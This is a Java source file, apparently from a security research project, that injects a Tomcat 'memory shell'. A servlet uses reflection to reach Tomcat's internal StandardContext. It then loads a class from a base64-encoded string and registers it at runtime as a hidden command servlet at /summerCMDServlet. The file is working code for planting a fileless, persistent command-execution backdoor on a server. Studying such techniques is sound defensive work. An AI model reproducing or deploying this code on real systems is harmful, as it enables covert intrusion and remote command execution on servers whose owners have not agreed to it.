package com.summer233;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

// import static com.summer233.DynamicUtils.SERVLET_CLASS_STRING;
// import static com.summer233.DynamicUtils.BASIC_SEVLET_CLASS_STRING_BASE64;
import static com.summer233.DynamicUtils.SUMMER_CMD_SERVLET_CLASS_STRING_BASE64;

/**
 * 访问这个 Servlet 将会动态添加自定义 Servlet
 * 测试版本 Tomcat 8.5.100
 *
 * @author su18,233
 */

@WebServlet(name = "DynamicAddTomcatServlet", urlPatterns = "/dynamicAddServlet")
public class AddTomcatServlet extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {
			PrintWriter writer = resp.getWriter();
			writer.println("debug info print test: start to add servlet<br>");
			// String servletName = "summerDynamicAddServletBasic";
			String servletName = "summerDynamicAddServletCMD";

			// 从 request 中获取 servletContext
			ServletContext servletContext = req.getServletContext();

			// 如果已有此 servletName 的 Servlet，则不再重复添加
			if (servletContext.getServletRegistration(servletName) == null) {

				StandardContext o = null;

				// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
				while (o == null) {
					Field f = servletContext.getClass().getDeclaredField("context");
					f.setAccessible(true);
					Object object = f.get(servletContext);

					switch (object) {
						case ServletContext sc -> servletContext = sc;
						case StandardContext sc -> o = sc;
						default -> throw new IllegalStateException("Unexpected value: " + object);
					}
				}

				// 创建自定义 Servlet
				// Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);
				// Class<?> servletClass =
				// DynamicUtils.getClass(BASIC_SEVLET_CLASS_STRING_BASE64);
				Class<?> servletClass = DynamicUtils.getClass(SUMMER_CMD_SERVLET_CLASS_STRING_BASE64);

				// 使用 Wrapper 封装 Servlet
				Wrapper wrapper = o.createWrapper();
				wrapper.setName(servletName);
				wrapper.setLoadOnStartup(1);
				wrapper.setServlet((Servlet) servletClass.getDeclaredConstructor().newInstance());
				wrapper.setServletClass(servletClass.getName());

				// 向 children 中添加 wrapper
				o.addChild(wrapper);

				// 添加 servletMappings
				// o.addServletMappingDecoded("/summerBasicServlet", servletName);
				o.addServletMappingDecoded("/summerCMDServlet", servletName);
				writer.println("tomcat servlet added");

			} else {
				writer.println("servlet already exists");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}